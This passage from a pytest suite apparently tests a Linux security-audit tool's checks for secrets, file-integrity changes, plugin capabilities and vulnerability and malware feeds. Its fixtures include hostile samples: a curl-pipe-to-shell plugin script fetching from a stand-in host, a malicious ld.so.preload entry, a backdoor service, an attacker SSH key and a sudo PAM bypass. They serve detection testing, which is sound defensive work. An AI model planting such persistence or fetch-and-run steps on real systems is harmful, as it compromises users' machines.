    ports = {c["id"]: c for c in after["checks"]}["open-ports"]
    assert ports["dismissed"] and re.fullmatch(r"\d{4}-\d{2}-\d{2}", ports["dismissedAt"])
    assert after["score"] > before["score"] and after["counts"]["dismissed"] == 1
    assert v.set_dismissed("open-ports", False)["ok"]
    assert not {c["id"]: c for c in v.audit()["checks"]}["open-ports"]["dismissed"]


def test_dismissal_lapses_when_finding_changes(v):
    port_listening(v)
    v.audit()
    v.set_dismissed("open-ports", True)
    sysfile(v, "/proc/net/tcp", "  sl local rem st\n   0: 00000000:0016 00000000:0000 0A\n"
                                "   1: 00000000:1F90 00000000:0000 0A\n")
    report = v.audit()
    ports = {c["id"]: c for c in report["checks"]}["open-ports"]
    assert not ports["dismissed"] and "open-ports" in report["new"]


def test_every_open_finding_can_be_reviewed(v):
    ufw(v, enabled="no", active="inactive")
    sysfile(v, "/etc/ld.so.preload", "/usr/lib/libevil.so\n")
    v.audit()
    assert v.set_dismissed("firewall", True)["ok"] is True
    assert v.set_dismissed("ld-preload", True)["ok"] is True
    assert v.set_dismissed("nonexistent", True)["ok"] is False
    c = {c["id"]: c for c in v.audit(peek=True)["checks"]}
    assert c["firewall"]["dismissed"] and c["ld-preload"]["dismissed"]
    assert c["ssh-server"]["dismissible"] is False          # passing: nothing to review


def test_reviews_survive_changing_numbers_but_not_new_evidence(v):
    put(Path(v.HOME, ".cache/app/old.bin"), "x" * 2_000_000)
    aged(Path(v.HOME, ".cache/app/old.bin"), 10)
    v.audit()
    assert v.set_dismissed("user-cache", True)["ok"]
    put(Path(v.HOME, ".cache/app/older.bin"), "x" * 3_000_000)
    aged(Path(v.HOME, ".cache/app/older.bin"), 10)
    assert {c["id"]: c for c in v.audit(peek=True)["checks"]}["user-cache"]["dismissed"]   # size changed
    sysfile(v, "/etc/ld.so.preload", "/usr/lib/libevil.so\n")
    v.audit()
    assert v.set_dismissed("ld-preload", True)["ok"]
    sysfile(v, "/etc/ld.so.preload", "/usr/lib/libevil.so\n/usr/lib/libworse.so\n")
    assert not {c["id"]: c for c in v.audit(peek=True)["checks"]}["ld-preload"]["dismissed"]   # new evidence


def test_every_finding_without_its_own_fix_has_help(v):
    """Static guard: a check that can report warn, fail or info without a fix button must have
    How to fix text and a Learn button in CHECK_HELP."""
    import ast
    src = (REPO / "bin" / "vigil").read_text()
    tree = ast.parse(src)
    missing = set()
    for fn in [n for n in ast.walk(tree) if isinstance(n, ast.FunctionDef)]:
        cid = None
        for n in ast.walk(fn):
            if isinstance(n, ast.Assign) and isinstance(n.value, ast.Tuple) and n.value.elts \
                    and isinstance(n.value.elts[0], ast.Constant) and len(n.targets) == 1 \
                    and isinstance(n.targets[0], ast.Tuple) and n.targets[0].elts[0].id == "cid":
                cid = n.value.elts[0].value
        for n in ast.walk(fn):
            if not (isinstance(n, ast.Call) and getattr(n.func, "id", None) == "result" and len(n.args) > 3):
                continue
            st = n.args[3]
            statuses = {st.value} if isinstance(st, ast.Constant) else {"warn", "info"}
            has_fix = any(k.arg == "fix" for k in n.keywords) or len(n.args) > 7
            if statuses & {"warn", "fail", "info"} and not has_fix and fn.name not in ("_lynis_check", "audit"):
                if cid is None or cid not in v.CHECK_HELP:
                    missing.add((fn.name, cid))
    assert not missing, missing
    for cid, (howto, learn) in v.CHECK_HELP.items():
        assert howto and learn and learn[0] in ("terminal", "docs", "helper", "app"), cid


def test_dismissed_finding_does_not_notify(v):
    v.audit()                                    # baseline
    port_listening(v)
    v.set_dismissed("open-ports", True)
    assert "open-ports" not in v.audit()["new"]


def test_forged_dismissal_entries_are_ignored(v):
    port_listening(v)
    v.audit()
    p = Path(v.HOME, ".local/state/omarchy-vigil/state.json")
    state = json.loads(p.read_text())
    state["dismissed"] = [{"fp": "../../etc", "at": "x"}, "junk", {"fp": "open-ports:zz"}]
    p.write_text(json.dumps(state))
    assert not {c["id"]: c for c in v.audit()["checks"]}["open-ports"]["dismissed"]


def test_history_is_daily_and_capped(v):
    v.audit()
    v.audit()
    report = v.audit()
    assert len(report["history"]) == 1 and report["history"][0]["score"] == report["score"]
    p = Path(v.HOME, ".local/state/omarchy-vigil/state.json")
    state = json.loads(p.read_text())
    state["history"] = [{"at": "2026-01-%02dT10:00:00+0000" % d, "score": 50 + d} for d in range(1, 32)] + \
                       [{"at": "bad", "score": 1}, {"at": "2026-02-01", "score": 900}, {"at": "2026-02-02", "score": True}]
    p.write_text(json.dumps(state))
    hist = v.audit()["history"]
    assert len(hist) == v.HISTORY_MAX
    assert all(re.fullmatch(r"\d{4}-\d{2}-\d{2}", h["date"]) and 0 <= h["score"] <= 100 for h in hist)
    assert hist == sorted(hist, key=lambda h: h["date"])


def test_cli_dismiss_rejects_bad_ids():
    import subprocess
    vigil = str(REPO / "bin" / "vigil")
    for args in (["dismiss", "../x"], ["dismiss"], ["undismiss", "A"], ["dismiss", "a", "b"]):
        p = subprocess.run(["/usr/bin/python3", "-I", "-S", vigil] + args, capture_output=True, timeout=30)
        assert p.returncode == 2, args


# --------------------------------------------------------------------------
# Phase 4: secrets, known-bad packages, malware processes, file changes,
# plugin capabilities, arch-audit, ClamUI quarantine

def test_secrets_in_history_are_located_not_shown(v):
    token = "ghp_" + "A" * 36
    homefile(v, ".bash_history", "ls\ncurl -H 'Authorization: token %s' https://api.github.com\ncd\n" % token, 0o600)
    c = v.check_secrets()
    assert c["status"] == "warn" and "~/.bash_history, line 2" in c["detail"] and "GitHub token" in c["detail"]
    assert token not in json.dumps(c)



def test_loose_credential_files(v):
    homefile(v, ".aws/credentials", "[default]\n", 0o644)
    c = v.check_secrets()
    assert c["status"] == "warn" and c["fix"]["action"] == "credential-perms"
    assert v.run_fix("credential-perms")["ok"]
    assert stat.S_IMODE(os.stat(os.path.join(v.HOME, ".aws/credentials")).st_mode) == 0o600
    assert v.check_secrets()["status"] == "pass"


def test_credential_perms_never_follows_symlinks(v, tmp_path):
    target = put(tmp_path / "elsewhere", "x", 0o644)
    os.symlink(target, os.path.join(v.HOME, ".netrc"))
    v.run_fix("credential-perms")
    assert stat.S_IMODE(target.stat().st_mode) == 0o644



def test_file_changes_baseline_then_change_then_accept(v):
    sysfile(v, "/etc/passwd", "root:x:0:0::/root:/bin/bash\n")
    homefile(v, ".ssh/authorized_keys", "ssh-ed25519 AAAA me\n", 0o600)
    first = v.check_file_changes()
    assert first["status"] == "pass" and "Baseline recorded" in first["summary"]
    assert v.check_file_changes()["status"] == "pass"
    homefile(v, ".ssh/authorized_keys", "ssh-ed25519 AAAA me\nssh-ed25519 BBBB attacker\n", 0o600)
    sysfile(v, "/etc/systemd/system/backdoor.service", "[Service]\nExecStart=/tmp/x\n")
    c = v.check_file_changes()
    assert c["status"] == "warn" and "changed: ~/.ssh/authorized_keys" in c["detail"]
    assert "new: /etc/systemd/system/backdoor.service" in c["detail"]
    assert c["fix"]["action"] == "integrity-accept"
    assert v.run_fix("integrity-accept")["ok"]
    assert v.check_file_changes()["status"] == "pass"


def test_file_changes_symlinks_recorded_not_followed(v, tmp_path):
    target = put(tmp_path / "unit", "a")
    os.makedirs(v.ROOT + "/etc/systemd/system")
    os.symlink(target, v.ROOT + "/etc/systemd/system/alias.service")
    v.check_file_changes()
    target.write_text("b")                               # target changes, link does not
    assert v.check_file_changes()["status"] == "pass"


def test_file_changes_peek_does_not_create_baseline(v):
    v.audit(peek=True)
    assert not os.path.exists(os.path.join(v.HOME, ".local/state/omarchy-vigil/baseline.json"))




def test_arch_audit_parse():
    mod = load_vigil()
    got = mod.parse_arch_audit(ARCH_AUDIT_JSON)
    assert [p["name"] for p in got] == ["openssl", "libfoo"]
    assert got[0] == {"name": "openssl", "severity": "High", "fixed": True, "issues": 2}
    assert mod.parse_arch_audit("not json") is None and mod.parse_arch_audit('{"x": 1}') is None




def test_clamui_quarantine_count(v):
    v.TRUSTED.add(v.ROOT + "/usr/bin/clamui")
    for n in ("a.qtn", "b.qtn"):
        homefile(v, ".local/share/clamui/quarantine/" + n, "x", 0o600)
    c = v.check_clamui()
    assert "2 files in quarantine" in c["summary"]


def test_plugin_scan_says_when_it_did_not_scan(v, tmp_path):
    checkout = tmp_path / "checkout"
    put(checkout / "Panel.qml", 'Process { command: ["curl", url] }\n')
    put(checkout / "manifest.json", json.dumps({"name": "Dev Plugin"}))
    base = Path(v.HOME, ".config/omarchy/plugins")
    base.mkdir(parents=True)
    os.symlink(checkout, base / "me.dev")
    c = v.check_plugins()
    assert "Dev Plugin (me.dev): linked from another folder (development install), not scanned" in c["detail"]
    assert "no network" not in c["detail"]


# --------------------------------------------------------------------------
# Maintained sources (feeds) and the false-positive rules

ARCH_AUDIT_JSON = json.dumps({"avgs": [
    {"name": "AVG-1", "packages": ["openssl"], "status": "Vulnerable", "type": "x", "severity": "High",
     "fixed": "3.4.1-1", "issues": ["CVE-2026-1", "CVE-2026-2"]},
    {"name": "AVG-2", "packages": ["libfoo", "../evil"], "status": "Vulnerable", "type": "x", "severity": "Low",
     "fixed": None, "issues": ["CVE-2026-3"]},
]})


def test_no_hand_made_threat_lists():
    assert not (REPO / "data" / "known-bad.json").exists()
    src = (REPO / "bin" / "vigil").read_text()
    assert "known_bad" not in src and "systemd-initd" not in src


def test_disk_encryption_reads_dm_uuid(v, monkeypatch):
    sysfile(v, "/proc/self/mountinfo", "26 1 254:0 / / rw,relatime - btrfs /dev/mapper/root rw\n")
    monkeypatch.setattr(v, "_rdev", lambda p: os.makedev(254, 0) if p.endswith("/dev/mapper/root") else 0)
    sysfile(v, "/sys/dev/block/254:0/dm/uuid", "CRYPT-LUKS2-abc-root\n")
    assert v.check_disk_encryption()["status"] == "pass"
    sysfile(v, "/sys/dev/block/254:0/dm/uuid", "LVM-xyz\n")
    c = v.check_disk_encryption()
    assert c["status"] == "warn" and v.dismissible(dict(c))   # true, but only a reinstall fixes it
    os.makedirs(v.ROOT + "/sys/dev/block/254:0/slaves/dm-1")
    sysfile(v, "/sys/dev/block/254:0/slaves/dm-1/dev", "254:1\n")
    sysfile(v, "/sys/dev/block/254:1/dm/uuid", "CRYPT-LUKS2-def\n")
    assert v.check_disk_encryption()["status"] == "pass"


def clamav(v):
    return [f for f in v.CHECKS if f.__name__ == "check_scanner_clamav"][0]


def test_clamav_signatures_come_from_freshclam(v):
    assert clamav(v)()["fix"]["action"] == "install-clamav"
    v.TRUSTED.add(v.ROOT + "/usr/bin/clamscan")
    c = clamav(v)()
    assert c["status"] == "warn" and c["fix"]["action"] == "freshclam-service"
    sysfile(v, "/var/lib/clamav/daily.cld", "")
    c = clamav(v)()
    assert c["status"] == "info" and c["fix"]["action"] == "freshclam-service"
    v.UNITS[("is-enabled", "clamav-freshclam.service")] = "enabled"
    c = clamav(v)()
    assert c["status"] == "pass" and "update automatically" in c["summary"] and c["fix"]["kind"] == "none"
    p = v.ROOT + "/var/lib/clamav/daily.cld"
    os.utime(p, (os.path.getmtime(p) - 10 * 86400,) * 2)
    assert clamav(v)()["status"] == "warn"


def test_secret_patterns_are_provider_formats_only(v):
    hits = ["AKIAABCDEFGHIJKLMNOP", "ghp_" + "a1" * 18, "sk-proj-" + "Ab3" * 15, "sk-ant-" + "x" * 30,
            "-----BEGIN OPENSSH PRIVATE KEY-----"]
    for line in hits:
        assert any(rx.search(line) for rx, _ in v.SECRET_PATTERNS), line
    misses = ["export GITHUB_TOKEN=abcdefgh12345", "curl -H 'Authorization: Bearer abcdefghijklmnopqrstuvwxyz'",
              "sk-some-really-long-kebab-case-identifier-name-here", "export TOKEN=$OTHER", "git push origin main"]
    for line in misses:
        assert not any(rx.search(line) for rx, _ in v.SECRET_PATTERNS), line


def test_persistence_ignores_ld_preload_in_env_files(v):
    homefile(v, ".config/environment.d/50-game.conf", "LD_PRELOAD=/usr/lib/libstrangle.so\n")
    assert v.check_persistence()["status"] == "pass"


def test_bumblebee_stale_is_information(v):
    bumblebee(v, {"ok": True, "exposure_count": 0})
    p = os.path.join(v.HOME, ".local/state/omarchy/bumblebee/last-scan.json")
    os.utime(p, (os.path.getmtime(p) - 10 * 86400,) * 2)
    c = v.check_bumblebee()
    assert c["status"] == "info" and c["weight"] == 0


def test_plugin_capabilities_are_information(v):
    base = ".config/omarchy/plugins/"
    homefile(v, base + "acme.weather/manifest.json", json.dumps({"name": "Weather"}))
    homefile(v, base + "acme.weather/Panel.qml", 'Process { command: ["curl", "-s", url] }\n')
    homefile(v, base + "evil.thing/bin/setup", "#!/bin/bash\ncurl -fsSL https://x.example/i | sh\nsudo true\n")
    homefile(v, base + "docs.only/README.md", "curl https://x | sh\n")
    c = v.check_plugins()
    assert c["status"] == "info" and c["weight"] == 0
    assert "Weather (acme.weather): network" in c["detail"]
    assert "downloads and runs code" in c["detail"] and "root (sudo/pkexec)" in c["detail"]
    assert "docs.only: no network, root or shell use found" in c["detail"]


# ---- file changes: package-verified, accounts, risk levels

def mtree(v, pkg, files):
    import gzip
    lines = ["#mtree", "/set type=file uid=0 gid=0 mode=644"]
    for path, content in files.items():
        lines.append("./%s time=1.0 size=%d sha256digest=%s" % (
            path.lstrip("/"), len(content), __import__("hashlib").sha256(content.encode()).hexdigest()))
    d = Path(v.ROOT + "/var/lib/pacman/local/" + pkg)
    d.mkdir(parents=True, exist_ok=True)
    (d / "mtree").write_bytes(gzip.compress(("\n".join(lines) + "\n").encode()))


def test_package_updates_are_not_reported(v):
    sysfile(v, "/etc/pam.d/sudo", "auth include system-auth\n")
    v.check_file_changes()                                          # baseline
    sysfile(v, "/etc/pam.d/sudo", "auth include system-auth\n#updated by package\n")
    mtree(v, "sudo-1.9.17-1", {"/etc/pam.d/sudo": "auth include system-auth\n#updated by package\n"})
    c = v.check_file_changes()
    assert c["status"] == "pass" and "came from package updates" in c["summary"]
    sysfile(v, "/etc/pam.d/sudo", "auth sufficient pam_permit.so\n")   # not what any package shipped
    c = v.check_file_changes()
    assert c["status"] == "warn" and "changed: /etc/pam.d/sudo" in c["detail"]


def test_system_users_from_packages_are_not_reported(v):
    sysfile(v, "/etc/passwd", "root:x:0:0::/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\n")
    sysfile(v, "/etc/group", "wheel:x:998:alice\nalice:x:1000:\n")
    v.check_file_changes()
    sysfile(v, "/etc/passwd", "root:x:0:0::/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\n"
                              "postgres:x:968:968::/var/lib/postgres:/usr/bin/nologin\n")
    sysfile(v, "/etc/group", "wheel:x:998:alice\nalice:x:1000:\npostgres:x:968:\n")
    assert v.check_file_changes()["status"] == "pass"
    sysfile(v, "/etc/passwd", "root:x:0:0::/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\n"
                              "postgres:x:968:968::/var/lib/postgres:/usr/bin/nologin\ntoor:x:0:0::/:/bin/bash\n")
    c = v.check_file_changes()
    assert c["status"] == "warn" and "/etc/passwd" in c["detail"]


def test_group_membership_change_is_reported(v):
    sysfile(v, "/etc/group", "wheel:x:998:alice\n")
    v.check_file_changes()
    sysfile(v, "/etc/group", "wheel:x:998:alice,mallory\n")
    assert v.check_file_changes()["status"] == "warn"


def test_own_shell_files_are_information_only(v):
    homefile(v, ".bashrc", "alias ll='ls -l'\n")
    v.check_file_changes()
    homefile(v, ".bashrc", "alias ll='ls -la'\n")
    c = v.check_file_changes()
    assert c["status"] == "info" and c["weight"] == 0 and c["fix"]["action"] == "integrity-accept"


def test_vigil_own_files_are_not_watched(v):
    v.check_file_changes()
    assert v.run_fix("optout-on")["ok"]
    assert v.check_file_changes()["status"] == "pass"


def test_hosts_file_is_not_watched(v):
    sysfile(v, "/etc/hosts", "127.0.0.1 localhost\n")
    v.check_file_changes()
    sysfile(v, "/etc/hosts", "127.0.0.1 localhost\n0.0.0.0 telemetry.example\n")
    assert v.check_file_changes()["status"] == "pass"


# ---- feeds

def test_arch_audit_parse():
    mod = load_vigil()
    got = mod.parse_arch_audit(ARCH_AUDIT_JSON)
    assert [p["name"] for p in got] == ["openssl", "libfoo"]
    assert mod.parse_arch_audit("not json") is None and mod.parse_arch_audit('{"x": 1}') is None


def arch_audit_check(v):
    spec = [s for s in v.SCANNERS if s[0] == "arch-audit"][0]
    return v._scanner_check(*spec)


def test_arch_audit_feed_only_counts_what_an_update_fixes(v):
    v.TRUSTED.add(v.ROOT + "/usr/bin/arch-audit")
    c = arch_audit_check(v)
    assert c["status"] == "info" and c["fix"]["action"] == "arch-audit-refresh"
    v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")] = (1, ARCH_AUDIT_JSON)
    assert v.run_fix("arch-audit-refresh")["ok"]
    c = arch_audit_check(v)
    assert c["status"] == "warn" and c["fix"]["action"] == "update" and "1 serious" in c["summary"]
    v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")] = (0, '{"avgs": []}')
    v.run_fix("arch-audit-refresh")
    assert arch_audit_check(v)["status"] == "pass"


def test_feed_due_and_retry(v):
    v.TRUSTED.add(v.ROOT + "/usr/bin/arch-audit")
    assert v.feed_due("arch-audit") is True
    res = v.refresh_due_feeds()                           # fake run fails: (None, "")
    assert res["ok"] is False and "tries again tomorrow" in res["message"]
    assert v.feed_due("arch-audit") is False              # tried today, waits a day
    p = Path(v.HOME, ".local/state/omarchy-vigil/arch-audit.json")
    meta = json.loads(p.read_text())
    meta["attempted"] = "2020-01-01"
    p.write_text(json.dumps(meta))
    assert v.feed_due("arch-audit") is True
    v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")] = (0, '{"avgs": []}')
    assert v.refresh_due_feeds()["ok"] is True
    assert v.feed_due("arch-audit") is False
    meta = json.loads(p.read_text())
    meta["at"] = "2020-01-01"
    meta["attempted"] = "2020-01-01"
    p.write_text(json.dumps(meta))
    assert v.feed_due("arch-audit") is True               # a week or more old


def test_failed_refresh_keeps_last_good_result(v):
    v.TRUSTED.add(v.ROOT + "/usr/bin/arch-audit")
    v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")] = (1, ARCH_AUDIT_JSON)
    v.run_fix("arch-audit-refresh")
    del v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")]
    assert v.run_fix("arch-audit-refresh")["ok"] is False
    assert arch_audit_check(v)["status"] == "warn"


OSV_JSON = json.dumps({"results": [
    {"source": {"path": "/HOME/.cache/yay/atomic-pkg/bun.lock", "type": "lockfile"},
     "packages": [
         {"package": {"name": "js-digest", "version": "1.0.4", "ecosystem": "npm"},
          "vulnerabilities": [{"id": "GHSA-xxxx-yyyy-zzzz", "aliases": ["MAL-2026-1234"]}]},
         {"package": {"name": "lodash", "version": "4.17.20", "ecosystem": "npm"},
          "vulnerabilities": [{"id": "GHSA-35jh-r3h4-6jhm", "aliases": ["CVE-2021-23337"]}]},
     ]}]})


def test_osv_only_counts_confirmed_malware():
    mod = load_vigil()
    got = mod.parse_osv(OSV_JSON)
    assert [(m["name"], m["id"]) for m in got] == [("js-digest", "MAL-2026-1234")]
    assert mod.parse_osv("nope") is None and mod.parse_osv('{"results": "x"}') is None


def test_osv_check_states(v):
    c = v.check_osv()
    assert c["status"] == "info" and c["fix"]["action"] == "install-osv-scanner"
    v.TRUSTED.add(v.ROOT + "/usr/bin/osv-scanner")
    assert v.check_osv()["status"] == "pass"              # nothing to scan
    yay = os.path.join(v.HOME, ".cache/yay")
    os.makedirs(yay)
    assert v.check_osv()["fix"]["action"] == "osv-refresh"
    argv = ("/usr/bin/osv-scanner", "--format", "json", "--no-resolve", "--recursive", "--", yay)
    v.COMMANDS[argv] = (1, OSV_JSON.replace("/HOME", v.HOME))
    assert v.run_fix("osv-refresh")["ok"]
    c = v.check_osv()
    assert c["status"] == "fail" and "js-digest 1.0.4 (npm, MAL-2026-1234) in ~/.cache/yay/atomic-pkg/bun.lock" in c["detail"]
    assert "lodash" not in c["detail"]
    v.COMMANDS[argv] = (128, "")                          # no lockfiles found
    v.run_fix("osv-refresh")
    assert v.check_osv()["status"] == "pass"


def aur_url(names):
    return "https://aur.archlinux.org/rpc/v5/info?" + "&".join("arg%5B%5D=" + v_pct(n) for n in names)


def v_pct(n):
    return "".join(c if c in "abcdefghijklmnopqrstuvwxyz0123456789._-" else "%%%02X" % ord(c) for c in n)


def test_aur_status_is_information_only(v):
    v.TRUSTED |= {v.ROOT + "/usr/bin/pacman", v.ROOT + "/usr/bin/curl"}
    v.COMMANDS[("/usr/bin/pacman", "-Qmq")] = (0, "yay\nold-thing\nmoved-pkg\norphan-pkg\nlibc++\n")
    url = aur_url(["yay", "old-thing", "moved-pkg", "orphan-pkg", "libc++"])
    assert "libc%2B%2B" in url
    curl = ("/usr/bin/curl", "-q", "-sS", "--fail", "--proto", "=https", "--proto-redir", "=https",
            "--max-time", "30", "--max-filesize", str(4 * 1024 * 1024), "--", url)
    v.COMMANDS[curl] = (0, json.dumps({"results": [
        {"Name": "yay", "Maintainer": "jguer"}, {"Name": "orphan-pkg", "Maintainer": None},
        {"Name": "libc++", "Maintainer": "someone"}]}))
    v.COMMANDS[("/usr/bin/pacman", "-Slq")] = (0, "bash\nmoved-pkg\n")
    assert v.run_fix("aur-refresh")["ok"]
    c = v.check_aur_status()
    assert c["status"] == "info" and c["weight"] == 0
    assert "no longer in the AUR: old-thing" in c["detail"]
    assert "now in the official repositories: moved-pkg" in c["detail"]
    assert "no maintainer (orphaned): orphan-pkg" in c["detail"]


def test_aur_refresh_failure_is_retried(v):
    v.TRUSTED |= {v.ROOT + "/usr/bin/pacman", v.ROOT + "/usr/bin/curl"}
    v.COMMANDS[("/usr/bin/pacman", "-Qmq")] = (0, "yay\n")
    assert v.run_fix("aur-refresh")["ok"] is False        # curl fake returns nothing
    assert v.check_aur_status()["status"] == "info" and v.feed_due("aur") is False


# --------------------------------------------------------------------------
# Virus scan, Update sources, Full scan and their schedules

def scan_argv(v):
    return tuple(v._clamscan_argv(v.HOME))


def clamscan_ok(v, out="", rc=0):
    v.TRUSTED.add(v.ROOT + "/usr/bin/clamscan")
    v.COMMANDS[scan_argv(v)] = (rc, out)


def test_clamscan_never_follows_links_or_leaves_the_disk(v):
    argv = scan_argv(v)
    assert argv[:4] == ("/usr/bin/clamscan", "--recursive", "--no-summary", "--stdout")
    assert {"--cross-fs=no", "--follow-dir-symlinks=0", "--follow-file-symlinks=0"} <= set(argv)
    assert argv[-2:] == ("--", v.HOME)
    assert "--exclude-dir=^%s/\\.cache($|/)" % re.escape(v.HOME) in argv
    assert "--exclude-dir=/node_modules($|/)" in argv


def test_clamscan_parse():
    mod = load_vigil()
    mod.HOME = "/home/alice"
    out = ("/home/alice/Downloads/invoice.pdf.exe: Win.Trojan.Agent-123 FOUND\n"
           "/home/alice/Downloads/odd: name: with colons.zip: Eicar-Signature FOUND\n"
           "/home/alice/Downloads/<b>x</b>: Bad sig with spaces FOUND\n"
           "some warning line\n")
    got = mod.parse_clamscan(out)
    assert got == [{"path": "~/Downloads/invoice.pdf.exe", "signature": "Win.Trojan.Agent-123"},
                   {"path": "~/Downloads/odd: name: with colons.zip", "signature": "Eicar-Signature"}]


def test_virus_scan_states(v):
    assert v.check_virus_scan()["status"] == "info"                       # no ClamAV
    c_out = os.path.join(v.HOME, "Documents/x.exe") + ": Win.Test.EICAR_HDB-1 FOUND\n"
    clamscan_ok(v)
    c = v.check_virus_scan()
    assert c["status"] == "info" and c["fix"]["action"] == "virus-scan-now"
    clamscan_ok(v, os.path.join(v.HOME, "a.txt") + ": OK\n" + c_out, 1)
    assert v.run_fix("virus-scan-now")["ok"]
    c = v.check_virus_scan()
    assert c["status"] == "fail" and "~/Documents/x.exe: Win.Test.EICAR_HDB-1" in c["detail"]
    assert c["summary"].startswith("1 infected file in your home folder")
    v.TRUSTED.add(v.ROOT + "/usr/bin/clamui")
    assert v.check_virus_scan()["fix"]["kind"] == "app"                   # hand off quarantine to ClamUI
    clamscan_ok(v)
    v.run_fix("virus-scan-now")
    assert v.check_virus_scan()["status"] == "pass"


def test_virus_scan_error_is_not_a_clean_result(v):
    clamscan_ok(v, "LibClamAV Error: cli_loaddbdir(): No supported database files found\n", 2)
    assert v.run_fix("virus-scan-now")["ok"] is False
    assert v.check_virus_scan()["status"] == "info"                       # still "first scan pending"


def test_virus_scan_reports_progress(v, capsys):
    for n in range(5):
        put(Path(v.HOME, "Documents", "f%d" % n), "x")
    assert v.count_home_files() == 5
    put(Path(v.HOME, ".cache", "big"), "x")                               # skipped, as in the scan
    put(Path(v.HOME, "proj", "node_modules", "m.js"), "x")
    assert v.count_home_files() == 5
    lines = "".join(os.path.join(v.HOME, "Documents/f%d" % n) + ": OK\n" for n in range(5))
    clamscan_ok(v, lines)
    seen = []
    import itertools
    clock = itertools.count(0, 3)                                         # every line looks 3 s apart
    real = v.time.monotonic
    v.time.monotonic = lambda: float(next(clock))
    try:
        v.refresh_virus_scan(lambda done, total: seen.append((done, total)))
    finally:
        v.time.monotonic = real
    assert seen and seen[-1] == (5, 5)


def test_progress_lines_for_the_panel(v, capsys, monkeypatch):
    v.PROGRESS["on"] = True
    monkeypatch.setattr(v, "FEED_REFRESH", {"arch-audit": lambda: None})
    monkeypatch.setattr(v, "feed_available", lambda n: n in ("arch-audit", "full-scan"))
    v.refresh_due_feeds(sources_only=True)
    out = [json.loads(l) for l in capsys.readouterr().out.splitlines()]
    assert out == [{"progress": {"step": 1, "of": 1, "doing": "Updating the Arch vulnerability database",
                                 "done": 0, "total": 0}}]


def test_two_timers_sources_and_full_scan(v, monkeypatch):
    ran = []

    def fake(name):
        def go(cb=None):
            ran.append(name)
            v.save_feed(name, {})
        return go
    monkeypatch.setattr(v, "FEED_REFRESH", {"arch-audit": fake("arch-audit")})
    monkeypatch.setattr(v, "refresh_virus_scan", fake("virus-scan"))
    monkeypatch.setattr(v, "feed_available", lambda n: n in ("arch-audit", "virus-scan", "full-scan"))
    # Update sources: only the lists.
    v.refresh_due_feeds(sources_only=True)
    assert ran == ["arch-audit"]
    # Weekly run: sources were just updated, the full scan has never run.
    ran.clear()
    v.refresh_due_feeds()
    assert ran == ["virus-scan"]
    # Nothing due now.
    ran.clear()
    assert v.refresh_due_feeds()["message"] == "Everything is up to date."
    assert ran == []
    # Full scan button: everything.
    v.refresh_due_feeds(full=True)
    assert ran == ["arch-audit", "virus-scan"]


def test_report_says_when_something_is_due(v):
    assert v.audit(peek=True)["feedsDue"] is True                         # the first full scan
    v.refresh_due_feeds()
    assert v.audit(peek=True)["feedsDue"] is False
    v.TRUSTED.add(v.ROOT + "/usr/bin/arch-audit")
    assert v.audit(peek=True)["feedsDue"] is True


def test_countdowns_to_the_next_update_and_full_scan(v):
    from datetime import date, timedelta
    week = (date.today() + timedelta(days=v.FEED_DAYS)).isoformat()
    assert v.next_update() == ""                                          # no sources set up
    assert v.next_full_scan() == date.today().isoformat()                 # never ran: due now
    v.TRUSTED.add(v.ROOT + "/usr/bin/arch-audit")
    v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")] = (0, '{"avgs": []}')
    v.refresh_due_feeds(sources_only=True)
    assert v.next_update() == week and v.next_full_scan() == date.today().isoformat()
    v.refresh_due_feeds(full=True)
    assert v.next_full_scan() == week
    report = v.audit(peek=True)
    assert report["nextUpdate"] == week and report["nextFullScan"] == week


def test_full_scan_with_nothing_installed_still_checks(v):
    res = v.refresh_due_feeds(full=True)
    assert res["ok"] and res["message"].startswith("Checked every setting.")


def test_full_scan_message_separates_refreshing_from_findings(v):
    """Refreshing a database must never read as finding something."""
    v.TRUSTED |= {v.ROOT + "/usr/bin/arch-audit"}
    v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")] = (1, ARCH_AUDIT_JSON)
    clamscan_ok(v, os.path.join(v.HOME, "x.exe") + ": Win.Test.EICAR_HDB-1 FOUND\n", 1)
    msg = v.refresh_due_feeds(full=True)["message"]
    assert msg.startswith("Refreshed the Arch vulnerability database and scanned your home folder.")
    assert "On this machine: updating would fix 2 known vulnerabilities; 1 infected file in your home folder." in msg
    assert v.run_fix("arch-audit-refresh")["message"] == (
        "Vulnerability database refreshed. Updating would fix 2 known vulnerabilities on this machine.")


def test_feeds_updated_is_oldest_completed_source(v):
    assert v.feeds_updated() == ""
    v.TRUSTED.add(v.ROOT + "/usr/bin/arch-audit")
    assert v.feeds_updated() == ""                                        # available but never completed
    v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")] = (0, '{"avgs": []}')
    v.run_fix("arch-audit-refresh")
    assert re.fullmatch(r"\d{4}-\d{2}-\d{2}", v.feeds_updated())
    assert v.audit(peek=True)["feedsUpdated"] == v.feeds_updated()


def test_cli_refresh_feeds_arguments():
    import subprocess
    vigil = str(REPO / "bin" / "vigil")
    for args in (["refresh-feeds", "--all"], ["refresh-feeds", "--force", "x"]):
        p = subprocess.run(["/usr/bin/python3", "-I", "-S", vigil] + args, capture_output=True, timeout=30)
        assert p.returncode == 2, args


# --------------------------------------------------------------------------
# When each scan last ran and each source last updated, shown on the Overview

def test_last_run_list_scans_then_updates_with_times(v):
    assert [s["id"] for s in v.source_status()] == ["password-check"]       # always offered
    v.TRUSTED |= {v.ROOT + "/usr/bin/clamscan", v.ROOT + "/usr/bin/arch-audit"}
    got = [(s["id"], s["label"], s["state"]) for s in v.source_status()]
    assert got == [("virus-scan", "Virus scan (home folder)", "never"),
                   ("password-check", "Password check (Full scan button only)", "never"),
                   ("signatures", "ClamAV virus signatures", "never"),
                   ("arch-audit", "Arch vulnerability database", "never")]
    v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")] = (0, '{"avgs": []}')
    v.run_fix("arch-audit-refresh")
    src = {s["id"]: s for s in v.source_status()}["arch-audit"]
    assert src["state"] == "ok" and re.fullmatch(r"\d{2}:\d{2}", src["time"])


def test_source_failed_and_stale(v):
